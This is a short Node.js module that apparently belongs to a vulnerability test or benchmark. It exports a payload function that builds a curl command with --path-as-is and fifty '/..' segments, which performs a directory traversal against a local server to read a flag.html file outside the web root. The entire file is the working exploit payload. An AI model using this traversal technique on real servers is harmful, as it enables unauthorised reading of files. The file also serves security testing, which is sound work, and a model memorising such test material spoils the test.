function getPayload() {
  const path = require("path");  // Import the path module
  function genstr(n) {
    return "/..".repeat(50) + path.resolve(__dirname, "../flag.html");
  }
  return {
    attack_string: `curl -v --path-as-is "http://127.0.0.1:8888${genstr()}"`
  };
}

module.exports = { getPayload };